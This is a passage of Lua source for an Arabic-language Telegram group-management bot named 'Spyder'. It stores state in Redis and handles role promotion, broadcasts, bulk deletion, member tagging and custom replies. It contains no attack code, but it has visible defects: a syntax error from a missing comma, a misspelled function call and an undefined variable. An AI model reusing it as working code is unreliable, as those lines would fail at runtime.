t = t..''..k..'- '..v..' ↫ ('..var..')\n'
else
t = t..''..k..'- '..v..'\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text and text:match("^اضف صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:set('Spyder:'..bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
redis:sadd('Spyder:'..bot_id.."Coomds"..msg.chat_id_,ComdNew)  
redis:setex('Spyder:'..bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, "⌔︙ دز نـوع رتـبـه ?\n⌔︙ {عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
if text and text:match("^مسح صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:del('Spyder:'..bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "*⌔︙ تم مسح الصلاحيه *\n✓") 
end
if redis:get('Spyder:'..bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,"*⌔︙ تم الغاء الامر *\n✓") 
redis:del('Spyder:'..bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"⌔︙ يمكنك اضافه صلاحيات {ادمن - مميز - عضو} \n⌔︙ ارسل الصلاحيه مجددا\n") 
return false
end
end
if text == 'ادمن' then
if not Owners(msg) then 
send(msg.chat_id_, msg.id_,"⌔︙ يمكنك اضافه صلاحيات {مميز - عضو} \n⌔︙ ارسل الصلاحيه مجددا\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"⌔︙ يمكنك اضافه صلاحيات {عضو} \n⌔︙ ارسل الصلاحيه مجددا\n") 
return false
end
end
if text == 'مدير' or text == 'ادمن' or text == 'مميز' or text == 'عضو' then
local textn = redis:get('Spyder:'..bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
redis:set('Spyder:'..bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, "☑ ︙ تـم اضـافـه الامـر √") 
redis:del('Spyder:'..bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
if text and text:match('رفع (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('رفع (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:sismember('Spyder:'..bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = redis:get('Spyder:'..bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'..'\n⌔︙تم رفعه '..RTPA..' هنا\n')   
redis:set('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA) 
redis:sadd('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'ادمن' and Owners(msg) then 
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'..'\n⌔︙تم رفعه '..RTPA..' هنا\n')   
redis:set('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)
redis:sadd('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'..'\n⌔︙تم رفعه '..RTPA..' هنا\n')   
redis:set('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
redis:sadd('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'..'\n⌔︙تم رفعه '..RTPA..' هنا\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('تنزيل (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('تنزيل (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:sismember('Spyder:'..bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = redis:get('Spyder:'..bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'..'\n⌔︙تم تنزيله من '..RTPA..' هنا\n')   
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_,result.sender_user_id_)  
redis:del('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'ادمن' and Owners(msg) then 
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'..'\n⌔︙تم تنزيله من '..RTPA..' هنا\n')   
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_,result.sender_user_id_) 
redis:del('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'..'\n⌔︙تم تنزيله من '..RTPA..' هنا\n')   
redis:srem('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_,result.sender_user_id_)  
redis:del('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'..'\n⌔︙تم تنزيله من '..RTPA..' هنا\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('^رفع (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:sismember('Spyder:'..bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = redis:get('Spyder:'..bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(text1[3] or 'Spyder')..')'..'\n⌔︙تم رفعه '..text1[2]..' هنا')   
redis:sadd('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_,result.id_)  
redis:set('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'ادمن' and Owners(msg) then 
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(text1[3] or 'Spyder')..')'..'\n⌔︙تم رفعه '..text1[2]..' هنا')   
redis:sadd('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_,result.id_)  
redis:set('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(text1[3] or 'Spyder')..')'..'\n⌔︙تم رفعه '..text1[2]..' هنا')   
redis:sadd('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_,result.id_)  
redis:set('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(text1[3] or 'Spyder')..')'..'\n⌔︙تم رفعه '..text1[2]..' هنا')   
end
else
info = '⌔︙ المعرف خطأ'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match('^تنزيل (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:sismember('Spyder:'..bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = redis:get('Spyder:'..bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(text1[3] or 'Spyder')..')'..'\n⌔︙تم تنريله من '..text1[2]..' هنا')   
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_,result.id_)  
redis:del('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'ادمن' and Owners(msg) then 
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(text1[3] or 'Spyder')..')'..'\n⌔︙تم تنريله من '..text1[2]..' هنا')   
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_,result.id_)  
redis:del('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(text1[3] or 'Spyder')..')'..'\n⌔︙تم تنريله من '..text1[2]..' هنا')   
redis:srem('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_,result.id_)  
redis:del('Spyder:'..bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(text1[3] or 'Spyder')..')'..'\n⌔︙تم تنريله من '..text1[2]..' هنا')   
end
else
info = '⌔︙ المعرف خطأ'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
----------------------------------------------------------
if text == "مسح رسايلي" or text == "مسح رسائلي" or text == "حذف رسايلي" or text == "حذف رسائلي" then  
send(msg.chat_id_, msg.id_,'⌔︙ تم مسح رسائلك جميعها'  )  
redis:del('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if text == "رسايلي" or text == "رسائلي" or text == "msg" then 
send(msg.chat_id_, msg.id_,'⌔︙ عدد رسائلك هنا ↫ { '..redis:get('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
end 
----------------------------------------------------------
if text == 'تفعيل الاذاعه' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تفعيل الاذاعه')
redis:del('Spyder:'..bot_id..'Public:radio')
end
if text == 'تعطيل الاذاعه' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تعطيل الاذاعه')
redis:set('Spyder:'..bot_id..'Public:radio', true)
end
----------------------------------------------------------
if text == 'تفعيل التواصل' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تفعيل التواصل')
redis:del('Spyder:'..bot_id..'Twal:Bot')
end
if text == 'تعطيل التواصل' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تعطيل التواصل')
redis:set('Spyder:'..bot_id..'Twal:Bot', true)
end
----------------------------------------------------------
if text == 'تفعيل الوضع الخدمي' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تفعيل الوضع الخدمي')
redis:del('Spyder:'..bot_id..'lock:Free')
end
if text == 'تعطيل الوضع الخدمي' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تعطيل الوضع الخدمي')
redis:set('Spyder:'..bot_id..'lock:Free', true)
end
----------------------------------------------------------
if text and text:match('^تنظيف (%d+)$') and Owners(msg) then
local num = tonumber(text:match('^تنظيف (%d+)$')) 
if num > 1000 then 
send(msg.chat_id_, msg.id_,'⌔︙ يمكنك التنظيف ل1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
DeleteMessage(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
send(msg.chat_id_,msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم حذف {'..num..'}')  
end
----------------------------------------------------------
if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
if Sudo_id(msg) then

redis:setex('Spyder:'..bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"⌔︙ ارسل لي الاسم الان ")  
end
return false
end

if text == ""..(redis:get('Spyder:'..bot_id..'Name:Bot') or 'العالمي').."" then  
Namebot = (redis:get('Spyder:'..bot_id..'Name:Bot') or 'العالمي')
local Spyder_Msg = {
'عمري الحلو',
'انت مو قبل يومين غلطت عليه؟  😒',
"يابعد روح "..Namebot.. "😘❤️",
'مشغول حالياً 🌚🌸',
'لابسك لتلح',
'كول ضلعي',
'تفضل حب 💞',
}
send(msg.chat_id_, msg.id_,'['..Spyder_Msg[math.random(#Spyder_Msg)]..']') 
return false
end
----------------------------------------------------------
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo_bot(msg) then 
if redis:get('Spyder:'..bot_id..'Public:radio') and not Sudo_id(msg) then 
send(msg.chat_id_, msg.id_,'⌔︙ الاذاعه معطله من قبل المطور الاساسي')
return false
end
redis:setex('Spyder:'..bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء >> { ملصق, متحركه, صوره, رساله }\n⌔︙ للخروج ارسل الغاء ") 
return false
end 
if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and Sudo_bot(msg) then 
if redis:get('Spyder:'..bot_id.."Public:radio") and not Sudo_id(msg) then 
send(msg.chat_id_, msg.id_,'⌔︙تم تعطيل الاذاعه من قبل المطور الاساسي !')
return false 
end
redis:setex('Spyder:'..bot_id.."Send:Bc:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء >> { ملصق, متحركه, صوره, رساله }\n⌔︙ للخروج ارسل الغاء ") 
return false
end
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and Sudo_bot(msg) then 
if redis:get('Spyder:'..bot_id..'Public:radio') and not Sudo_id(msg) then 
send(msg.chat_id_, msg.id_,'⌔︙ الاذاعه معطله من قبل المطور الاساسي')
return false
end
redis:setex('Spyder:'..bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء >> { ملصق, متحركه, صوره, رساله }\n⌔︙ للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and Sudo_bot(msg) then 
if redis:get('Spyder:'..bot_id..'Public:radio') and not Sudo_id(msg) then 
send(msg.chat_id_, msg.id_,'⌔︙ الاذاعه معطله من قبل المطور الاساسي')
return false
end
redis:setex('Spyder:'..bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ ارسل لي التوجيه الان") 
return false
end 
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and Sudo_bot(msg) then 
if redis:get('Spyder:'..bot_id..'Public:radio') and not Sudo_id(msg) then 
send(msg.chat_id_, msg.id_,'⌔︙ الاذاعه معطله من قبل المطور الاساسي')
return false
end
redis:setex('Spyder:'..bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ ارسل لي التوجيه الان") 
return false
end 
----------------------------------------------------------
if text and text:match('^ضع اسم (.*)') and Owners(msg) or text and text:match('^وضع اسم (.*)') and Owners(msg) then 
local Name = text:match('^ضع اسم (.*)') or text:match('^وضع اسم (.*)') 
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"⌔︙ البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⌔︙ ليست لدي صلاحية تغير اسم المجموعه")  
else
sebd(msg.chat_id_,msg.id_,'⌔︙ تم تغيير اسم المجموعه الى {['..Name..']}')  
end
end,nil) 
end
----------------------------------------------------------
if text == "تاك للكل" and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200
},function(ta,Spyder)
local t = "\n⌔︙ قائمة الاعضاء \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
x = 0
local list = Spyder.members_
for k, v in pairs(list) do
x = x + 1
if redis:get('Spyder:'..bot_id..'user:Name'..v.user_id_) then
t = t..""..x.." - {[@"..redis:get('Spyder:'..bot_id..'user:Name'..v.user_id_).."]}\n"
else
t = t..""..x.." - {"..v.user_id_.."}\n"
end
end
send(msg.chat_id_,msg.id_,t)
end,nil)
end
----------------------------------------------------------
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Owners(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_,"⌔︙ لا يمكنك تنزيل المطور الاساسي")
return false 
end
if redis:sismember('Spyder:'..bot_id..'Set:Sudo_bot',result.sender_user_id_) then
dev = 'المطور ،' else dev = '' end
if redis:sismember('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, result.sender_user_id_) then
crr = 'منشئ اساسي ،' else crr = '' end
if redis:sismember('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, result.sender_user_id_) then
cr = 'منشئ ،' else cr = '' end
if redis:sismember('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, result.sender_user_id_) then
own = 'مدير ،' else own = '' end
if redis:sismember('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.sender_user_id_) then
mod = 'ادمن ،' else mod = '' end
if redis:sismember('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.sender_user_id_) then
vip = 'مميز ،' else vip = ''
end
if GetZanCan(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n⌔︙ تم تنزيل الشخص من الرتب التاليه \n⌔︙ { "..dev..''..crr..''..cr..''..own..''..mod..''..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n⌔︙ليس لديه رتب حتى يمكنني تنزيله \n")
end
if tonumber(SUDO) == tonumber(msg.sender_user_id_) then
redis:srem('Spyder:'..bot_id..'Set:Sudo_bot', result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.sender_user_id_)
elseif redis:sismember('Spyder:'..bot_id..'Set:Sudo_bot',msg.sender_user_id_) then
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
elseif redis:sismember('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) then
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, result.sender_user_id_)
elseif redis:sismember('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, msg.sender_user_id_) then
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, result.sender_user_id_)
elseif redis:sismember('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, msg.sender_user_id_) then
redis:srem('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
----------------------------------------------------------
if text == ("مسح ردود المطور") and Sudo_id(msg) then 
local list = redis:smembers('Spyder:'..bot_id..'List:Rd:Sudo_bot')
for k,v in pairs(list) do
redis:del('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Gif"..v)   
redis:del('Spyder:'..bot_id.."Add:Rd:Sudo_bot:vico"..v)   
redis:del('Spyder:'..bot_id.."Add:Rd:Sudo_bot:stekr"..v)     
redis:del('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Text"..v)   
redis:del('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Photo"..v)
redis:del('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Video"..v)
redis:del('Spyder:'..bot_id.."Add:Rd:Sudo_bot:File"..v)
redis:del('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Audio"..v)
redis:del('Spyder:'..bot_id..'List:Rd:Sudo_bot')
end
send(msg.chat_id_, msg.id_,"⌔︙ تم مسح ردود المطور")
end

if text == ("ردود المطور") and Sudo_id(msg) then 
local list = redis:smembers('Spyder:'..bot_id..'List:Rd:Sudo_bot')
text = "\n⌔︙ قائمة ردود المطور \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
if redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Gif"..v) then
db = 'متحركه 🎭'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:vico"..v) then
db = 'بصمه 📢'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:stekr"..v) then
db = 'ملصق 🃏'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Text"..v) then
db = 'رساله ✉'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Photo"..v) then
db = 'صوره 🎇'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Video"..v) then
db = 'فيديو 📹'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:File"..v) then
db = 'ملف 📁'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Audio"..v) then
db = 'اغنيه 🎵'
end
text = text..""..k.." >> ("..v..") ↫ {"..db.."}\n"
end
if #list == 0 then
text = "⌔︙لا يوجد ردود للمطور"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = redis:get('Spyder:'..bot_id..'Text:Sudo_bot:Bot'..msg.sender_user_id_..':'..msg.chat_id_)
if redis:get('Spyder:'..bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
redis:del('Spyder:'..bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_)
if msg.content_.sticker_ then   
redis:set('Spyder:'..bot_id.."Add:Rd:Sudo_bot:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
redis:set('Spyder:'..bot_id.."Add:Rd:Sudo_bot:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
redis:set('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
redis:set('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Text"..test, text)  
end  
if msg.content_.audio_ then
redis:set('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
redis:set('Spyder:'..bot_id.."Add:Rd:Sudo_bot:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
redis:set('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
